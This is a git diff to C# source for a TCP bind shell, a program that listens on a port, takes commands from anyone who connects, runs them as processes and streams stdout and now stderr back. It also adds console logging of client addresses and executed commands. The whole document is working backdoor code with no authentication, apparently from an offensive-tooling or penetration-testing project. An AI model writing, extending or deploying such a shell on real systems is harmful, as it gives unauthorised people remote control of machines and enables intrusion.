@@ -27,13 +27,21 @@ namespace TCP_Bind_Shell {
             server.Start();
 
             while (true) {
+                // accepting connection as tcp client
                 using(var client = server.AcceptTcpClient()) {
+                    // get client ip address and port number
+                    string clientAddr = client.Client.RemoteEndPoint.ToString();
+
+                    Console.WriteLine("[+] Client Connected: {0}", clientAddr);
+
                     // get streams
                     var stream = client.GetStream();
                     var wr = new StreamWriter(stream) { AutoFlush = true };
                     var rd = new StreamReader(stream);
-                       
-                    while(true) {
+
+                    Console.WriteLine("[+] Start Reading Inputs");
+
+                    while (true) {
                         // seding the banner and prompt
                         wr.Write(string.Format("{0}@{1} $ ", Environment.UserName, Environment.MachineName));
                         
@@ -45,7 +53,7 @@ namespace TCP_Bind_Shell {
                         } else if (cmd == "exit") {
                             break;
                         }
-
+                           
                         // preprocess command line recievided from client
                         string[] parts = cmd.Split(' ');
                         string fileName = parts.First();
@@ -55,7 +63,8 @@ namespace TCP_Bind_Shell {
                         Process process = new Process() {
                             StartInfo = new ProcessStartInfo(fileName, cmdArgs) {
                                 UseShellExecute = false,
-                                RedirectStandardOutput = true
+                                RedirectStandardOutput = true,
+                                RedirectStandardError = true
                             }
                         };
 
@@ -63,12 +72,16 @@ namespace TCP_Bind_Shell {
                         try {
                             process.Start();
                             process.StandardOutput.BaseStream.CopyTo(stream);
+                            process.StandardError.BaseStream.CopyTo(stream);
                             process.WaitForExit();
+                            Console.WriteLine("[+] Executed '{0}'", cmd);
                         } catch(Exception e) {
                             wr.WriteLine(e.Message);
+                            Console.WriteLine("[x] Failed to Execute '{0}'", cmd);
                         }
                     }
 
+                    Console.WriteLine("[+] Releasing Resources for {0}", clientAddr);
                     // closing other stream
                     rd.Close();
                     wr.Close();
